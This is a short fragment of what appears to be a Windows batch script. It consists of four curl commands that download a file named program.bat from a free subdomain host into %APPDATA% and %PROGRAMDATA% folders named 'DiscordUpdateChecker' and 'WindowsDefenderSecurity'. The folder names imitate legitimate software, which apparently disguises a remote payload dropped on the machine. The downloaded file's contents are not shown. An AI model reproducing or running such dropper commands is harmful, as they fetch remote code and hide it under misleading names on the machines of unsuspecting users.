...
curl -L "https://freestream.us.to/schulprojekt/program.bat" --output "%APPDATA%/DiscordUpdateChecker/program.bat"
curl -L "https://freestream.us.to/schulprojekt/program.bat" --output "%PROGRAMDATA%/DiscordUpdateChecker/program.bat"

curl -L "https://freestream.us.to/schulprojekt/program.bat" --output "%APPDATA%/WindowsDefenderSecurity/program.bat"
curl -L "https://freestream.us.to/schulprojekt/program.bat" --output "%PROGRAMDATA%/WindowsDefenderSecurity/program.bat"
